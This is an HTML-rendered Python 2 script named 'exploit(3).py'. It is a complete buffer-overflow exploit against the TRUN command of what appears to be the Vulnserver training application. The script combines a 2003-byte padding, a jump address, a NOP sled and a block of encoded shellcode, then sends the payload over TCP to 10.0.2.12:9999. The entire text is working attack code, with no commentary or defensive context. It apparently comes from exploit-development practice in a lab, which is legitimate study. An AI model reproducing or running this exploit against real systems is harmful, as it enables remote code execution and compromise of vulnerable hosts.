<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>exploit(3).py</title>
</head><body>#!/usr/bin/ python&#09;<br/>
<br/>
import sys<br/>
import socket<br/>
&nbsp; <br/>
command = "TRUN /.:/"<br/>
<br/>
shellcode = "A" * 2003<br/>
<br/>
jmpcode = "\xaf\x11\x50\x62"<br/>
<br/>
overflow = ("\xb8\x11\xeb\x9e\x5c\xd9\xd0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"<br/>
"\x52\x31\x42\x12\x03\x42\x12\x83\xfb\x17\x7c\xa9\x07\x0f\x03"<br/>
"\x52\xf7\xd0\x64\xda\x12\xe1\xa4\xb8\x57\x52\x15\xca\x35\x5f"<br/>
"\xde\x9e\xad\xd4\x92\x36\xc2\x5d\x18\x61\xed\x5e\x31\x51\x6c"<br/>
"\xdd\x48\x86\x4e\xdc\x82\xdb\x8f\x19\xfe\x16\xdd\xf2\x74\x84"<br/>
"\xf1\x77\xc0\x15\x7a\xcb\xc4\x1d\x9f\x9c\xe7\x0c\x0e\x96\xb1"<br/>
"\x8e\xb1\x7b\xca\x86\xa9\x98\xf7\x51\x42\x6a\x83\x63\x82\xa2"<br/>
"\x6c\xcf\xeb\x0a\x9f\x11\x2c\xac\x40\x64\x44\xce\xfd\x7f\x93"<br/>
"\xac\xd9\x0a\x07\x16\xa9\xad\xe3\xa6\x7e\x2b\x60\xa4\xcb\x3f"<br/>
"\x2e\xa9\xca\xec\x45\xd5\x47\x13\x89\x5f\x13\x30\x0d\x3b\xc7"<br/>
"\x59\x14\xe1\xa6\x66\x46\x4a\x16\xc3\x0d\x67\x43\x7e\x4c\xe0"<br/>
"\xa0\xb3\x6e\xf0\xae\xc4\x1d\xc2\x71\x7f\x89\x6e\xf9\x59\x4e"<br/>
"\x90\xd0\x1e\xc0\x6f\xdb\x5e\xc9\xab\x8f\x0e\x61\x1d\xb0\xc4"<br/>
"\x71\xa2\x65\x4a\x21\x0c\xd6\x2b\x91\xec\x86\xc3\xfb\xe2\xf9"<br/>
"\xf4\x04\x29\x92\x9f\xff\xba\x97\x5f\xfd\x35\xc0\x5d\x01\x5b"<br/>
"\x4c\xeb\xe7\x31\x7c\xbd\xb0\xad\xe5\xe4\x4a\x4f\xe9\x32\x37"<br/>
"\x4f\x61\xb1\xc8\x1e\x82\xbc\xda\xf7\x62\x8b\x80\x5e\x7c\x21"<br/>
"\xac\x3d\xef\xae\x2c\x4b\x0c\x79\x7b\x1c\xe2\x70\xe9\xb0\x5d"<br/>
"\x2b\x0f\x49\x3b\x14\x8b\x96\xf8\x9b\x12\x5a\x44\xb8\x04\xa2"<br/>
"\x45\x84\x70\x7a\x10\x52\x2e\x3c\xca\x14\x98\x96\xa1\xfe\x4c"<br/>
"\x6e\x8a\xc0\x0a\x6f\xc7\xb6\xf2\xde\xbe\x8e\x0d\xee\x56\x07"<br/>
"\x76\x12\xc7\xe8\xad\x96\xe7\x0a\x67\xe3\x8f\x92\xe2\x4e\xd2"<br/>
"\x24\xd9\x8d\xeb\xa6\xeb\x6d\x08\xb6\x9e\x68\x54\x70\x73\x01"<br/>
"\xc5\x15\x73\xb6\xe6\x3f")<br/>
<br/>
payload = command + shellcode + jmpcode + "\x90" * 32 + overflow<br/>
try:<br/>
&#09;s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )<br/>
&#09;s.connect(("10.0.2.12", 9999))<br/>
&#09;s.send((payload))<br/>
&#09;s.close()<br/>
&#09;print "[+] offset sent"<br/>
except:<br/>
&#09;print "[-] connection error"<br/>
&#09;sys.exit()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<br/>
</body></html>